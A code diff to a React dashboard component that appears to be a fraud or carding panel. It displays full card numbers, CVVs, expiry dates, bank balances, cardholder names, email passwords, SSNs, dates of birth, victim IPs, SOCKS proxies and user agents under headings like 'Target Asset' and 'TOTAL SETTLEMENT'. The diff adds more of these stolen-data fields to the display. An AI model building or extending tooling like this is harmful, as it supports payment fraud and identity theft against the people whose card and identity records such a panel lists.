@@ -334,6 +334,7 @@ export default function Dashboard() {
 
                             {/* Content */}
                             <div className="p-8 space-y-6 flex-1 font-mono relative">
+                                {/* Title Row */}
                                 <div className="flex justify-between items-end border-b border-white/10 pb-3">
                                     <span className="text-[10px] text-gray-500 uppercase font-black tracking-widest">Target Asset</span>
                                     <div className="flex flex-col items-end">
@@ -343,30 +344,43 @@ export default function Dashboard() {
                                 </div>
 
                                 <div className="grid grid-cols-1 gap-6 text-xs">
+
+                                    {/* ── Card Core Data ── */}
                                     <div className="bg-white/2 p-6 rounded-2xl border border-white/10 relative group-hover:border-red-600/40 transition-all shadow-inner">
                                         <p className="text-[9px] text-red-500 uppercase font-black mb-4 tracking-widest flex items-center gap-2">
                                             <span className="h-1 w-1 bg-red-600 rounded-full animate-ping"></span>
                                             Primary Protocol Data
                                         </p>
-                                        <p className="text-3xl font-black tracking-[0.25em] text-white drop-shadow-[0_0_10px_rgba(255,255,255,0.15)] mb-6">
+                                        <p className="text-3xl font-black tracking-[0.25em] text-white drop-shadow-[0_0_10px_rgba(255,255,255,0.15)] mb-4">
                                             {formatCardNumber(showReceipt?.cardNumber || '')}
                                         </p>
-                                        <div className="grid grid-cols-3 gap-4 pt-2 border-t border-white/5">
+                                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 pt-2 border-t border-white/5">
                                             <div>
                                                 <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Expiry</p>
                                                 <p className="text-sm font-black text-white">{showReceipt?.expiry || '??/??'}</p>
                                             </div>
                                             <div>
-                                                <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Security</p>
+                                                <p className="text-[8px] text-gray-600 uppercase font-black mb-1">CVV</p>
                                                 <p className="text-sm font-black text-red-600 animate-pulse">{showReceipt?.cvv || '***'}</p>
                                             </div>
                                             <div>
-                                                <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Protocol</p>
+                                                <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Network</p>
                                                 <p className="text-sm font-black text-white uppercase">{showReceipt?.type || 'N/A'}</p>
                                             </div>
+                                            <div>
+                                                <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Bank / Balance</p>
+                                                <p className="text-sm font-black text-green-400">{showReceipt?.bank || '---'}</p>
+                                            </div>
                                         </div>
+                                        {showReceipt?.holder && (
+                                            <div className="mt-4 pt-3 border-t border-white/5">
+                                                <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Card Holder</p>
+                                                <p className="text-sm font-black text-white uppercase tracking-widest">{showReceipt.holder}</p>
+                                            </div>
+                                        )}
                                     </div>
 
+                                    {/* ── Geolocation + Access Nodes ── */}
                                     <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                         <div className="bg-white/3 p-5 rounded-2xl border border-white/10 hover:border-red-600/30 transition-colors">
                                             <p className="text-[9px] text-red-500 uppercase font-black mb-4 tracking-widest">Geolocation</p>
@@ -378,7 +392,7 @@ export default function Dashboard() {
                                         </div>
                                         <div className="bg-white/3 p-5 rounded-2xl border border-white/10 hover:border-red-600/30 transition-colors">
                                             <p className="text-[9px] text-red-500 uppercase font-black mb-4 tracking-widest">Access Nodes</p>
-                                            <div className="space-y-4">
+                                            <div className="space-y-3">
                                                 {showReceipt?.email && (
                                                     <div>
                                                         <p className="text-[8px] text-gray-700 uppercase font-black mb-1">E-Mail Access</p>
@@ -391,28 +405,59 @@ export default function Dashboard() {
                                                         <p className="text-xs text-red-500/80 truncate font-mono tracking-tighter">{showReceipt.password}</p>
                                                     </div>
                                                 )}
+                                                {showReceipt?.phone && (
+                                                    <div>
+                                                        <p className="text-[8px] text-gray-700 uppercase font-black mb-1">Phone</p>
+                                                        <p className="text-xs text-gray-300">{showReceipt.phone}</p>
+                                                    </div>
+                                                )}
                                             </div>
                                         </div>
                                     </div>
 
+                                    {/* ── Identity + Network ── */}
                                     <div className="bg-white/2 p-5 rounded-2xl border border-white/5 grid grid-cols-2 gap-6">
                                         <div>
                                             <p className="text-[9px] text-red-500 uppercase font-black tracking-widest mb-3">Identity</p>
-                                            <p className="text-[8px] text-gray-600 uppercase font-black mb-1">SSN Node</p>
+                                            <p className="text-[8px] text-gray-600 uppercase font-black mb-1">SSN</p>
                                             <p className="text-xs text-white/90 mb-3">{showReceipt?.ssn || '---'}</p>
-                                            <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Birth Date</p>
+                                            <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Date of Birth</p>
                                             <p className="text-xs text-white/90">{showReceipt?.dob || '---'}</p>
                                         </div>
                                         <div>
                                             <p className="text-[9px] text-red-500 uppercase font-black tracking-widest mb-3">Network</p>
                                             <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Source IP</p>
                                             <p className="text-xs text-blue-400 font-mono tracking-tighter mb-3">{showReceipt?.ip || '0.0.0.0'}</p>
-                                            <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Contact Dial</p>
-                                            <p className="text-xs text-white/90">{showReceipt?.phone || '---'}</p>
+                                            <p className="text-[8px] text-gray-600 uppercase font-black mb-1">Proxy / SOCKS</p>
+                                            <p className="text-xs text-cyan-400/80 font-mono tracking-tighter">{showReceipt?.proxy || '---'}</p>
                                         </div>
                                     </div>
+
+                                    {/* ── User Agent ── */}
+                                    {showReceipt?.userAgent && (
+                                        <div className="bg-white/2 p-5 rounded-2xl border border-white/5 hover:border-red-600/20 transition-colors">
+                                            <p className="text-[9px] text-red-500 uppercase font-black mb-3 tracking-widest">User Agent / Browser Info</p>
+                                            <p className="text-[10px] text-gray-400 font-mono leading-relaxed break-all">{showReceipt.userAgent}</p>
+                                        </div>
+                                    )}
+
+                                    {/* ── Video Link ── */}
+                                    {showReceipt?.videoLink && (
+                                        <div className="bg-white/2 p-5 rounded-2xl border border-white/5 hover:border-red-600/20 transition-colors">
+                                            <p className="text-[9px] text-red-500 uppercase font-black mb-3 tracking-widest">Video Evidence Link</p>
+                                            <a
+                                                href={showReceipt.videoLink}
+                                                target="_blank"
+                                                rel="noopener noreferrer"
+                                                className="text-xs text-blue-400 hover:text-blue-300 underline underline-offset-2 font-mono break-all transition-colors"
+                                            >
+                                                {showReceipt.videoLink}
+                                            </a>
+                                        </div>
+                                    )}
                                 </div>
 
+                                {/* ── Total Settlement ── */}
                                 <div className="pt-8 border-t border-white/10 flex justify-between items-center bg-linear-to-b from-transparent to-white/1 -mx-8 px-8 pb-4">
                                     <div className="space-y-1">
                                         <span className="text-2xl font-black uppercase italic text-gray-700 tracking-tighter block leading-none">TOTAL SETTLEMENT</span>
